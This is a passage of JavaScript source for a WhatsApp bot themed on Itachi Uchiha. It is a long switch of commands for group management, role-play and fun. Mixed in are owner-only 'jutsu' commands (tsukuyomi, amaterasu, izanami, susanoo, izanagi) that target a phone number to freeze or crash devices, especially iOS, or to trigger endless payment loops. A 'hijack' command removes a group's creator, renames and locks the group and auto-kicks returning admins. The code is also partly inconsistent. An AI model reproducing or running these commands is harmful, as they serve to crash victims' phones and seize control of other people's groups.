}
break;

case 'listadmin':
case 'admin': {
  if (!isCreator) return reply("Owner only");
  if (!m.isGroup) return reply(msg.only.group);

  const groupAdmins = participants.filter(p => p.admin);
  const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
  const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net';

  let text = `* Group Admins:*\n${listAdmin}`;
  rich.sendMessage(m.chat, {
    text,
    mentions: [...groupAdmins.map(v => v.id), owner]
  }, { quoted: m });
}
break;

case 'delete':
case 'del': {
  if (!isCreator) return reply("Owner only");
  if (!m.quoted) return reply("Reply to a message to delete it");

  rich.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.quoted.id,
      participant: m.quoted.sender
    }
  });
}
break;

case 'grouplink': {
  if (!m.isGroup) return reply(msg.only.group);
  if (!isBotAdmins) return reply("Bot must be admin");

  let response = await rich.groupInviteCode(m.chat);
  rich.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\n*🔗 Group Link:* ${groupMetadata.subject}`, m, { detectLink: true });
}
break;

case 'tag':
case 'totag': {
  if (!isCreator) return reply("Owner only");
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("Only group admins");
  if (!isBotAdmins) return reply("Bot must be admin");
  if (!m.quoted) return reply(`Reply with ${prefix + command} to a message`);

  rich.sendMessage(m.chat, {
    forward: m.quoted.fakeObj,
    mentions: participants.map(a => a.id)
  });
}
break;
case 'tagall': {
  if (!isCreator) return reply("Owner only");
  if (!m.isGroup) return reply(msg.only.group);

  const textMessage = args.join(" ") || "No context";
  let teks = `\`\`\` Tagging all members:\`\`\`\n> *${textMessage}*\n\n`;

  const groupMetadata = await rich.groupMetadata(m.chat);
  const participants = groupMetadata.participants;

  for (let mem of participants) {
    teks += `@${mem.id.split("@")[0]}\n`;
  }

  rich.sendMessage(m.chat, {
    text: teks,
    mentions: participants.map((a) => a.id)
  }, { quoted: m });
}
break;

case 'hidetag': {
  if (!isCreator) return reply("Owner only");
  const groupMetadata = await rich.groupMetadata(m.chat);
  const participants = groupMetadata.participants;
  
  rich.sendMessage(m.chat, {
    text: q || '',
    mentions: participants.map(a => a.id)
  }, { quoted: m });
}
break;

case 'promote': {
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("Only group admins can use this!");
  if (!isBotAdmins) return reply("Bot needs to be admin first!");

  let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await rich.groupParticipantsUpdate(m.chat, [users], 'promote');
  reply("User promoted to admin");
}
break;

case 'demote': {
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("Only group admins can use this!");
  if (!isBotAdmins) return reply("Bot needs to be admin first!");

  let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await rich.groupParticipantsUpdate(m.chat, [users], 'demote');
  reply("User demoted from admin");
}
break;

case 'mute': {
  if (!isCreator) return reply("Owner only");
  if (!m.isGroup) return reply("Group command only");
  if (!isAdmins) return reply("Admins only");
  if (!isBotAdmins) return reply("Bot needs to be admin");

  await rich.groupSettingUpdate(m.chat, 'announcement');
  reply("Group muted. Only admins can text!");
}
break;

case 'unmute': {
  if (!isCreator) return reply("Owner only");
  if (!m.isGroup) return reply("Group command only");
  if (!isAdmins) return reply("Admins only");
  if (!isBotAdmins) return reply("Bot needs to be admin");

  await rich.groupSettingUpdate(m.chat, 'not_announcement');
  reply("Group unmuted. Everyone can text!");
}
break;

case 'left': {
  if (!isCreator) return reply("Owner only");
  await rich.groupLeave(m.chat);
  reply("Goodbye🤗");
}
break;

case 'add': {
  if (!isCreator) return reply("Owner only");
  if (!m.isGroup) return reply(msg.only.group);
  if (!isBotAdmins) return reply("Bot must be admin");

  let users = m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await rich.groupParticipantsUpdate(m.chat, [users], 'add');
  reply("User added to group");
}
break;
case 'setpp': {
  if (!isCreator) return reply('This command is only for the owner.');
  if (!quoted || !/image/.test(mime)) return reply(`Reply to an image to set as bot profile picture.`);
  let media = await quoted.download();
  await rich.updateProfilePicture(botNumber, media);
  reply('╭─〔 𝐈𝐭𝐚𝐜𝐡𝐢 × 𝐌𝐃 〕\n Profile picture updated.');
}
break;
case 'react-ch': 
case 'reactch': {
    if (!isCreator) return reply(`Sorry, only premium users can use this command`);

    if (!args[0]) {
        return reply("Usage:\n.reactch https://whatsapp.com/channel/abcd Akane");
    }

    if (!args[0].startsWith("https://whatsapp.com/channel/")) {
        return reply("This channel link is invalid.");
    }

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const emojiInput = args.slice(1).join(' ');
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        const lower = c.toLowerCase();
        return hurufGaya[lower] || c;
    }).join('');

    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];

        const res = await rich.newsletterMetadata("invite", channelId);
        await rich.newsletterReactMessage(res.id, messageId, emoji);

        return reply(` Successfully sent reaction *${emoji}* in channel *${res.name}*.`);
    } catch (e) {
        console.error(e);
        return reply(" Failed to send the reaction. Please check the link and try again.");
    }
};
break;

case 'runtime':
case 'alive': {
    reply(
`👁️ 𝑰𝑻𝑨𝑪𝑯𝑰 𝑴𝑫 — 𝑨𝑾𝑨𝑲𝑬𝑵𝑬𝑫

⏳ 𝑼𝒑𝒕𝒊𝒎𝒆 : ${runtime(process.uptime())}

🔥 "As long as I breathe…
the Genjutsu never fades."`
    );
}
break;
 case 'ping':
case 'speed': {

let timestamp = speed()
let latensi = speed() - timestamp

reply(
`👁️ 𝑰𝑻𝑨𝑪𝑯𝑰 𝑴𝑫 — 𝑺𝑷𝑬𝑬𝑫 𝑻𝑬𝑺𝑻

⚡ 𝑳𝒂𝒕𝒆𝒏𝒄𝒚 : ${latensi.toFixed(4)} 𝐌𝐒

🩸 "You couldn’t react…
even if you saw it coming."`
);
}
break;
case 'public': {
    if (!isCreator) return m.reply("Owner only.");
    setSetting("bot", "mode", "public");
    rich.public = true;
    m.reply(
`👁️ 𝑰𝑻𝑨𝑪𝑯𝑰 𝑴𝑫 — 𝑷𝑼𝑩𝑳𝑰𝑪 𝑴𝑶𝑫𝑬

🌍 Access Unsealed
⚔️ All users may engage

🔥 "The battlefield is now open."`
    );
}
break;

case 'private':
case 'self': {
    if (!isCreator) return m.reply("Owner only.");
    setSetting("bot", "mode", "self");
    rich.public = false;
    m.reply(
`👁️ 𝑰𝑻𝑨𝑪𝑯𝑰 𝑴𝑫 — 𝑺𝑬𝑳𝑭 𝑴𝑶𝑫𝑬

🔒 Access Sealed
🩸 Owner authority only

❄️ "Silence… this is my Genjutsu."`
    );
}
break;

// Bot Picture Selector Command
case 'setbotpic':
case 'changepic':
case 'botpic': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can change the bot's appearance.\n\n` +
            `_"Only the village leader can alter my form."_`
        );
    }
    
    // Array of 7 bot profile pictures
    const botPictures = [
        {
            id: 1,
            url: "https://i.postimg.cc/h4xyXsKC/38e7ffd336110b098fded3523f74ac6a.jpg",
            name: "Itachi Uchiha - Classic"
        },
        {
            id: 2,
            url: "https://files.catbox.moe/52a49i.jpg",
            name: "Itachi Uchiha - Akatsuki"
        },
        {
            id: 3,
            url: "https://files.catbox.moe/jlmv1m.jpg",
            name: "Itachi Uchiha - Sharingan"
        },
        {
            id: 4,
            url: "https://files.catbox.moe/slyk1l.jpg",
            name: "Itachi Uchiha - Young"
        },
        {
            id: 5,
            url: "https://files.catbox.moe/z9veae.jpg",
            name: "Itachi Uchiha - Edo Tensei"
        },
        {
            id: 6,
            url: "https://files.catbox.moe/z9veae.jpg",
            name: "Itachi Uchiha - Crow"
        },
        {
            id: 7,
            url: "https://files.catbox.moe/cwnfhu.jpg",
            name: "Itachi Uchiha - Mangekyō"
        }
    ];
    
    // If no number provided, show menu
    if (!text) {
        let menu = `👁️ *Bot Appearance Selection*\n\n`;
        menu += `Choose which form I should take:\n\n`;
        
        botPictures.forEach(pic => {
            menu += `*${pic.id}.* ${pic.name}\n`;
        });
        
        menu += `\n*Usage:* ${prefix + command} <number>\n`;
        menu += `*Example:* ${prefix + command} 1\n\n`;
        menu += `_"Select the appearance that suits the moment..."_ - Itachi Uchiha`;
        
        return reply(menu);
    }
    
    const choice = parseInt(text);
    
    // Validate choice
    if (isNaN(choice) || choice < 1 || choice > 7) {
        return reply(
            `❌ *Invalid Selection*\n\n` +
            `Please choose a number between 1 and 7.\n\n` +
            `_"Make a valid choice..."_`
        );
    }
    
    const selectedPic = botPictures[choice - 1];
    
    try {
        // Download image
        reply(`🔄 *Transformation Jutsu Activating...*\n\n⏳ Please wait...`);
        
        const response = await axios.get(selectedPic.url, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'binary');
        
        // Update bot profile picture
        await rich.updateProfilePicture(rich.user.id, buffer);
        
        // Success message
        let successMsg = `✅ *Transformation Complete*\n\n`;
        successMsg += `👁️ *New Form:* ${selectedPic.name}\n\n`;
        successMsg += `_"My appearance has changed... witness the new form."_ - Itachi Uchiha`;
        
        await rich.sendMessage(
            m.chat,
            { 
                image: { url: selectedPic.url },
                caption: successMsg
            },
            { quoted: m }
        );
        
    } catch (error) {
        console.error("BOT PIC ERROR:", error);
        reply(
            `❌ *Transformation Failed*\n\n` +
            `Could not change profile picture.\n\n` +
            `Error: ${error.message}\n\n` +
            `_"The transformation jutsu has failed..."_`
        );
    }
}
break;

// View current bot pic
case 'currentpic':
case 'botpicnow': {
    try {
        const ppUrl = await rich.profilePictureUrl(rich.user.id, 'image').catch(() => null);
        
        if (!ppUrl) {
            return reply(
                `❌ *No Profile Picture*\n\n` +
                `The bot currently has no profile picture.\n\n` +
                `_"My form is hidden in shadow..."_`
            );
        }
        
        await rich.sendMessage(
            m.chat,
            {
                image: { url: ppUrl },
                caption: `👁️ *Current Bot Appearance*\n\n_"This is my current form..."_ - Itachi Uchiha`
            },
            { quoted: m }
        );
        
    } catch (error) {
        console.error("CURRENT PIC ERROR:", error);
        reply(
            `❌ *Failed to retrieve current picture*\n\n` +
            `_"My reflection cannot be captured..."_`
        );
    }
}
break;

// Preview all bot pics
case 'previewpics':
case 'allbotpics': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Sorry, only the Hokage can preview all forms.\n\n` +
            `_"These transformations are classified."_`
        );
    }
    
    const botPictures = [
        {
            id: 1,
            url: "https://i.postimg.cc/h4xyXsKC/38e7ffd336110b098fded3523f74ac6a.jpg",
            name: "Itachi Uchiha - Classic"
        },
        {
            id: 2,
            url: "https://files.catbox.moe/52a49i.jpg",
            name: "Itachi Uchiha - Akatsuki"
        },
        {
            id: 3,
            url: "https://files.catbox.moe/jlmv1m.jpg",
            name: "Itachi Uchiha - Sharingan"
        },
        {
            id: 4,
            url: "https://files.catbox.moe/slyk1l.jpg",
            name: "Itachi Uchiha - Young"
        },
        {
            id: 5,
            url: "https://files.catbox.moe/z9veae.jpg",
            name: "Itachi Uchiha - Edo Tensei"
        },
        {
            id: 6,
            url: "https://files.catbox.moe/z9veae.jpg",
            name: "Itachi Uchiha - Crow"
        },
        {
            id: 7,
            url: "https://files.catbox.moe/cwnfhu.jpg",
            name: "Itachi Uchiha - Mangekyō"
        }
    ];
    
    reply(`👁️ *Sending all available forms...*\n\n_"Witness all my transformations..."_`);
    
    for (const pic of botPictures) {
        try {
            await rich.sendMessage(
                m.chat,
                {
                    image: { url: pic.url },
                    caption: `*${pic.id}.* ${pic.name}\n\nUse: ${prefix}setbotpic ${pic.id}`
                },
                { quoted: m }
            );
            
            // Small delay to avoid spam
            await new Promise(resolve => setTimeout(resolve, 1000));
            
        } catch (error) {
            console.error(`Error sending pic ${pic.id}:`, error);
        }
    }
    
    reply(`✅ *All forms displayed*\n\n_"Choose wisely..."_ - Itachi Uchiha`);
}
break;
// ==================== COMMAND CASES ====================

// Tsukuyomi Command
case 'tsukuyomi':
case 'genjutsu': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Only the Hokage can use Tsukuyomi.\n\n` +
            `_"This genjutsu is beyond your capabilities..."_`
        );
    }
    
    if (!q) {
        return reply(
            `⚠️ *Tsukuyomi - Infinite Loop Genjutsu*\n\n` +
            `*Usage:* ${prefix}tsukuyomi <number>\n` +
            `*Example:* ${prefix}tsukuyomi 628xxx\n\n` +
            `_"Trapped in the world of Tsukuyomi... time becomes meaningless."_\n\n` +
            `⚠️ *WARNING:* This technique causes severe lag/delay.`
        );
    }
    
    let target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    reply(`🔴 *Tsukuyomi Activated*\n\n⏳ Casting infinite loop genjutsu on target...\n\n_"72 hours of torture in an instant..."_`);
    
    await tsukuyomi(target);
    
    reply(`✅ *Tsukuyomi Complete*\n\n_"The genjutsu has been cast... they are trapped."_ - Itachi Uchiha`);
}
break;

// Amaterasu Command
case 'amaterasu':
case 'blackflames': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Only the Hokage can use Amaterasu.\n\n` +
            `_"The black flames would consume you..."_`
        );
    }
    
    if (!q) {
        return reply(
            `⚠️ *Amaterasu - Black Flames*\n\n` +
            `*Usage:* ${prefix}amaterasu <number>\n` +
            `*Example:* ${prefix}amaterasu 628xxx\n\n` +
            `*Target:* iOS devices\n\n` +
            `_"The flames of Amaterasu burn eternally..."_\n\n` +
            `⚠️ *WARNING:* Causes device freeze on iOS.`
        );
    }
    
    let target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    reply(`🔥 *Amaterasu - Black Flames Ignited*\n\n⚡ Burning target with eternal flames...\n\n_"Nothing can extinguish these flames..."_`);
    
    await amaterasu(target);
    
    reply(`✅ *Amaterasu Complete*\n\n_"The black flames have consumed everything."_ - Itachi Uchiha`);
}
break;

// Izanami Command
case 'izanami':
case 'endlessloop': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Only the Hokage can use Izanami.\n\n` +
            `_"This jutsu requires perfect understanding..."_`
        );
    }
    
    if (!q) {
        return reply(
            `⚠️ *Izanami - Endless Loop*\n\n` +
            `*Usage:* ${prefix}izanami <number>\n` +
            `*Example:* ${prefix}izanami 628xxx\n\n` +
            `_"Trapped in an endless loop of payment requests..."_\n\n` +
            `⚠️ *WARNING:* Creates infinite payment loop.`
        );
    }
    
    let target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    reply(`🌀 *Izanami Activated*\n\n⚡ Creating endless loop...\n\n_"You cannot escape this reality..."_`);
    
    await izanami(target);
    
    reply(`✅ *Izanami Complete*\n\n_"They are now trapped in the loop forever."_ - Itachi Uchiha`);
}
break;

// Susanoo Command
case 'susanoo':
case 'perfectwarrior': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Only the Hokage can summon Susanoo.\n\n` +
            `_"You lack the chakra for this technique..."_`
        );
    }
    
    if (!q) {
        return reply(
            `⚠️ *Susanoo - Perfect Warrior*\n\n` +
            `*Usage:* ${prefix}susanoo <number>\n` +
            `*Example:* ${prefix}susanoo 628xxx\n\n` +
            `*Target:* iOS devices\n` +
            `*Power Level:* 720 strikes\n\n` +
            `_"Behold the power of the perfect Susanoo..."_\n\n` +
            `⚠️ *WARNING:* Heavy iOS crash attack.`
        );
    }
    
    let target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    reply(`⚔️ *Susanoo Summoned*\n\n🔴 The perfect warrior strikes 720 times...\n\n_"No defense can withstand Susanoo..."_`);
    
    await susanoo(target);
    
    reply(`✅ *Susanoo Attack Complete*\n\n_"The perfect warrior has fulfilled its duty."_ - Itachi Uchiha`);
}
break;

// Izanagi Command  
case 'izanagi':
case 'realityrewrite': {
    if (!isCreator) {
        return reply(
            `🚫 *Forbidden Technique*\n\n` +
            `Only the Hokage can use Izanagi.\n\n` +
            `_"This power rewrites reality itself..."_`
        );
    }
    
    if (!q) {
        return reply(
            `⚠️ *Izanagi - Reality Rewrite*\n\n` +
            `*Usage:* ${prefix}izanagi <number>\n` +
            `*Example:* ${prefix}izanagi 628xxx\n\n` +
            `*Effect:* Complete device freeze\n\n` +
            `_"Reality bends to the Uchiha will..."_\n\n` +
            `⚠️ *WARNING:* Ultimate freeze attack.`
        );
    }
    
    let target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    reply(`👁️ *Izanagi - Rewriting Reality*\n\n⚡ Bending existence itself...\n\n_"What was once real becomes illusion..."_`);
    
    await izanagi(target);
    
    reply(`✅ *Izanagi Complete*\n\n_"Reality has been rewritten... nothing remains."_ - Itachi Uchiha`);
}
break;
case 'addsudo': {
    if (!isCreator) return m.reply("Owner only.");
    if (!m.mentionedJid[0]) return m.reply("👁️ Mention a user to grant SUDO.");
    
    sudo.push(m.mentionedJid[0]);
    m.reply("✅ 𝑺𝑼𝑫𝑶 𝑨𝑪𝑪𝑬𝑺𝑺 𝑮𝑹𝑨𝑵𝑻𝑬𝑫.");
}
break;
case 'delsudo': {
    if (!isCreator) return m.reply("Owner only.");
    if (!m.mentionedJid[0]) return m.reply("👁️ Mention a user to revoke SUDO.");

    sudo = sudo.filter(v => v !== m.mentionedJid[0]);
    m.reply("❌ 𝑺𝑼𝑫𝑶 𝑨𝑪𝑪𝑬𝑺𝑺 𝑹𝑬𝑽𝑶𝑲𝑬𝑫.");
}
break;
case 'sudolist': {
    if (!isCreator) return m.reply("Owner only.");
    if (sudo.length < 1) return m.reply("⚠️ No SUDO users found.");

    let list = sudo.map((v, i) => `${i + 1}. @${v.split("@")[0]}`).join("\n");
    m.reply(`👁️ 𝑺𝑼𝑫𝑶 𝑼𝑺𝑬𝑹𝑺\n\n${list}`, { mentions: sudo });
}
break;
case 'propose': {
    if (!m.mentionedJid[0])
        return m.reply("💍 Mention the person you want to propose to.");

    let target = m.mentionedJid[0];
    let senderName = m.pushName || "Someone";

    m.reply(
`💖 𝑳𝑶𝑽𝑬 𝑪𝑶𝑵𝑭𝑬𝑺𝑺𝑰𝑶𝑵 💖

👤 From: ${senderName}
👑 To: @${target.split("@")[0]}

🌸 "In this chaotic world…
I choose you."

💍 Will you accept this proposal?
Reply with *yes* or *no* 💌`,
{ mentions: [target] }
    );
}
break;
case 'yes': {
    if (!m.quoted) return;
    m.reply("💞 Proposal accepted! Love wins 🥰");
}
break;

case 'no': {
    if (!m.quoted) return;
    m.reply("💔 Proposal declined… stay strong 🥲");
}
break;
case 'confess': {
    if (!m.isGroup)
        return m.reply("🩸 Confessions must be made in public.");

    if (!m.mentionedJid[0])
        return m.reply("🩸 Mention the one your heart is bound to.");

    let target = m.mentionedJid[0];
    if (target === m.sender)
        return m.reply("🖤 You cannot confess to yourself.");

    let senderName = m.pushName || "Someone";

    await rich.sendMessage(
        m.chat,
        {
            text:
`╔══════════════════════╗
║   🖤 𝐂𝐎𝐍𝐅𝐄𝐒𝐒𝐈𝐎𝐍 🖤   ║
╚══════════════════════╝

👁️ From : ${senderName}
🩸 To   : @${target.split("@")[0]}

_"I tried to silence my heart,
but it kept whispering your name."_

🕯️ Do you accept this confession?
Reply with *yes* or *no* 🩸`,
            mentions: [target]
        },
        { quoted: m }
    );
}
break;
case 'yes': {
    if (!m.quoted) return;
    m.reply("🩸 The confession was accepted… a cursed bond is formed.");
}
break;

case 'no': {
    if (!m.quoted) return;
    m.reply("🖤 The confession was rejected… some genjutsu must end.");
}
break;
case 'pickup': {
    const lines = [
        "Are you a genjutsu? Because my world changed when I saw you.",
        "Even Itachi couldn’t hide how you make my heart react.",
        "Is this illusion… or are you really this perfect?"
    ];
    let pick = lines[Math.floor(Math.random() * lines.length)];
    m.reply(`🌹 ${pick}`);
}
break;
case 'kiss': {
    if (!m.mentionedJid[0])
        return m.reply("😈 Mention someone to kiss.");

    let target = m.mentionedJid[0];
    m.reply(
`😘 @${m.sender.split("@")[0]} kisses @${target.split("@")[0]} softly…

🩸 A silent bond is sealed.`,
    { mentions: [m.sender, target] }
    );
}
break;
case 'hug': {
    if (!m.mentionedJid[0])
        return m.reply("🤗 Mention someone to hug.");

    let target = m.mentionedJid[0];
    m.reply(
`🤗 @${m.sender.split("@")[0]} hugs @${target.split("@")[0]}

🖤 Even darkness feels warm.`,
    { mentions: [m.sender, target] }
    );
}
break;
case 'love': {
    if (!m.mentionedJid[0])
        return m.reply("💖 Mention someone you love.");

    let target = m.mentionedJid[0];
    m.reply(
`💖 @${m.sender.split("@")[0]} loves @${target.split("@")[0]}

_"Love is the strongest jutsu of all."_
— Itachi`,
    { mentions: [m.sender, target] }
    );
}
break;
case 'couple': {
    if (!m.isGroup) return m.reply("💑 Group only.");

    let members = participants.map(v => v.id);
    let a = members[Math.floor(Math.random() * members.length)];
    let b = members[Math.floor(Math.random() * members.length)];

    if (a === b) return m.reply("🖤 Fate is undecided. Try again.");

    m.reply(
`💑 𝑪𝑶𝑼𝑷𝑳𝑬 𝑴𝑨𝑻𝑪𝑯

👁️ @${a.split("@")[0]} ❤️ @${b.split("@")[0]}

_"Two souls, one illusion."_
`,
    { mentions: [a, b] }
    );
}
break;
case 'breakup': {
    if (!m.mentionedJid[0])
        return m.reply("💔 Mention who you want to break up with.");

    let target = m.mentionedJid[0];
    m.reply(
`💔 @${m.sender.split("@")[0]} breaks up with @${target.split("@")[0]}

🩸 Even the strongest genjutsu can fade.`,
    { mentions: [m.sender, target] }
    );
}
break;
case 'setaza': {
    if (!isCreator) return m.reply("Owner only.");

    let text = args.join(" ");
    if (!text) return m.reply("❌ Provide account details.");

    azaData.text = text;

    m.reply(
`✅ 𝑨𝒁𝑨 𝑺𝑬𝑻 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳𝑳𝒀

👁️ Auto-send enabled
🩸 Keyword: aza / account number`
    );
}
break;
case 'stats': {
    const os = require('os');

    const totalRam = (os.totalmem() / 1024 / 1024).toFixed(2);
    const freeRam = (os.freemem() / 1024 / 1024).toFixed(2);
    const usedRam = (totalRam - freeRam).toFixed(2);
    const cpu = os.cpus()[0].model;
    const cores = os.cpus().length;
    const platform = os.platform();
    const nodeVersion = process.version;
    const uptime = runtime(process.uptime());

    const start = performance.now();
    const end = performance.now();
    const speed = (end - start).toFixed(4);

    const statsText = `╔══════════════════════╗
║   📊 𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐒   ║
╚══════════════════════╝

🧠 CPU      : ${cpu}
⚙️ Cores    : ${cores}
💾 RAM Used : ${usedRam} MB / ${totalRam} MB
🖥️ Platform : ${platform}
🧩 Node.js  : ${nodeVersion}
⏱️ Uptime   : ${uptime}
📡 Speed    : ${speed} ms

🔴⚫ Sharingan Status : Active ⚫🔴`;

    await rich.sendMessage(m.chat, { text: statsText }, { quoted: m });
}
break;
case 'hijack': {
  if (!isCreator) return reply("❌ Owner only command");
  if (!m.isGroup) return reply("❌ This command can only be used in groups!");

  const botNumber = devtrust.user.id?.split(':')[0];
  const botDeployer = m.sender;

  const groupMetadata = await devtrust.groupMetadata(m.chat);
  const participants = groupMetadata.participants;

  const creator = groupMetadata.owner;
  const admins = participants.filter(p => p.admin);

  // ─── REMOVE GROUP CREATOR ─────────────────────
  if (creator && creator !== botDeployer && creator !== botNumber) {
    try {
      await devtrust.groupParticipantsUpdate(m.chat, [creator], 'remove');
      reply(`🔥 Successfully removed the group creator: @${creator.split('@')[0]}`);
    } catch (err) {
      console.error("Error removing creator:", err);
      reply("⚠️ Could not remove the creator. Restricting instead.");

      try {
        await devtrust.groupSettingUpdate(m.chat, 'announcement');
        reply("🚫 Group set to admins-only mode.");
      } catch (e) {
        console.error("Error restricting group:", e);
      }
    }
  }

  // ─── CHANGE GROUP NAME ─────────────────────────
  try {
    await devtrust.groupUpdateSubject(m.chat, "𝐈𝐭𝐚𝐜𝐡𝐢 × 𝐌𝐃 was here");
    reply("👑 Group name changed successfully.");
  } catch (err) {
    console.error("Error changing group name:", err);
    reply("⚠️ Failed to change group name.");
  }

  // ─── CHANGE GROUP DESCRIPTION ──────────────────
  const description = `
╔══════════════════════════════════════╗
║   ☣️ 𝗚𝗥𝗢𝗨𝗣 𝗧𝗔𝗞𝗘𝗢𝗩𝗘𝗥 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ☣️   ║
║        𝐈𝐓𝐀𝐂𝐇𝐈 × 𝐌𝐃 𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐄𝐃        ║
╚══════════════════════════════════════╝
👁 This domain is no longer neutral.
➤ Group Status : UNDER CONTROL
➤ Authority    : 𝐈𝐓𝐀𝐂𝐇𝐈 × 𝐌𝐃
➤ Developer    : Dev Kingsley

━━━━━━━━━━━【 𝐓𝐇𝐄 𝐈𝐓𝐀𝐂𝐇𝐈 𝐎𝐑𝐃𝐄𝐑 】━━━━━━━━━━━
⚔ Absolute Compliance
⚔ Zero Disrespect
⚔ No Leaks / Screenshots
⚔ No Betrayal
⚔ Mandatory Activity
⚔ Closed Territory
⚔ Respect Authority
⚔ No Spam
⚔ Bot Decision is LAW

━━━━━━━━━━━【 𝐄𝐍𝐅𝐎𝐑𝐂𝐄𝐌𝐄𝐍𝐓 】━━━━━━━━━━━
⚠ Warning
⛔ Permanent Removal
💀 WhatsApp Ban & Bug ☠️

Observe. Obey. Survive.
`;

  try {
    await devtrust.groupUpdateDescription(m.chat, description);
    reply("📝 Group description updated.");
  } catch (err) {
    console.error("Error updating description:", err);
    reply("⚠️ Failed to update description.");
  }

  // ─── LOCK GROUP ────────────────────────────────
  try {
    await devtrust.groupSettingUpdate(m.chat, 'announcement');
    reply("🔒 Group locked (admins only).");
  } catch (err) {
    console.error("Error locking group:", err);
  }

  // ─── AUTO-KICK REJOINERS (ONCE) ─────────────────
  const kicked = new Set();

  devtrust.ev.on('group-participants.update', async (update) => {
    if (update.id !== m.chat) return;

    for (const user of update.participants) {
      const isTarget =
        user === creator ||
        admins.some(a => a.id === user);

      if (isTarget && !kicked.has(user)) {
        try {
          await devtrust.groupParticipantsUpdate(m.chat, [user], 'remove');
          kicked.add(user);
          reply(`💥 Auto-kicked: @${user.split('@')[0]}`);
        } catch (e) {
          console.error("Auto-kick error:", e);
        }
      }
    }
  });

}
break;
case 'announce': {
    if (!m.isGroup) return m.reply("⚠️ This command is for groups only.");
    if (!isAdmins && !isCreator)
        return m.reply("🚫 Only admins can make announcements.");

    if (!text)
        return m.reply(`📢 Usage:\n${prefix}announce <message>`);

    // Fetch group metadata to get participants
    const groupMetadata = await rich.groupMetadata(m.chat);
    const allMembers = groupMetadata.participants.map(u => u.id);

    const announceText = `╔══════════════════════╗
║   📢 𝐀𝐍𝐍𝐎𝐔𝐍𝐂𝐄𝐌𝐄𝐍𝐓   ║
╚══════════════════════╝

📌 Message:
${text}

━━━━━━━━━━━━━━━━━━
👁️ Itachi × MD
_"Pay attention… this matters."_`;

    await rich.sendMessage(
        m.chat,
        {
            text: announceText,
            mentions: allMembers // This tags everyone
        },
        { quoted: m }
    );
}
break;
case 'getpanel': {
    // Buttons for panel selection
    const buttons = [
        { buttonId: '.panel1', buttonText: { displayText: '1GB Panel' }, type: 1 },
        { buttonId: '.panel2', buttonText: { displayText: '2GB Panel' }, type: 1 },
        { buttonId: '.panel3', buttonText: { displayText: '3GB Panel' }, type: 1 },
        { buttonId: '.panel4', buttonText: { displayText: '4GB Panel' }, type: 1 },
        { buttonId: '.panel5', buttonText: { displayText: '5GB Panel' }, type: 1 },
        { buttonId: '.panel6', buttonText: { displayText: '6GB Panel' }, type: 1 },
        { buttonId: '.panel7', buttonText: { displayText: '7GB Panel' }, type: 1 },
        { buttonId: '.panel8', buttonText: { displayText: '8GB Panel' }, type: 1 },
        { buttonId: '.panel9', buttonText: { displayText: '9GB Panel' }, type: 1 },
        { buttonId: '.panel10', buttonText: { displayText: '10GB Panel' }, type: 1 },
    ];

    // Send the buttons
    await rich.sendMessage(m.chat, {
        text: '🚀 *Select a Panel Size*',
        buttons: buttons,
        headerType: 1
    }, { quoted: m });
}
break;

// Handle panel button clicks
if (command.startsWith('panel')) {
    const panelSize = command.replace('panel', '') + 'GB';
    const replyText = `📦 You selected: *${panelSize} Panel*\n\n` +
                      `Contact me on Telegram to get your panel:\n` +
                      `@dev_kingsley\n\n` +
                      `💡 Hurry! Panels are limited.`;
    await rich.sendMessage(m.chat, { text: replyText }, { quoted: m });
}
// ══════════════════════════════════════════════════════════
// 🛡️ AUTOMATIC MODERATION HANDLERS
// ══════════════════════════════════════════════════════════

// Place this BEFORE your switch(command) statement, in the main message handler

// 1. WORD FILTER CHECK

// ══════════════════════════════════════════════════════════
// 🛡️ MODERATION - FILTER SYSTEM
// ══════════════════════════════════════════════════════════

case 'filter':
case 'addfilter': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin to use this feature!');
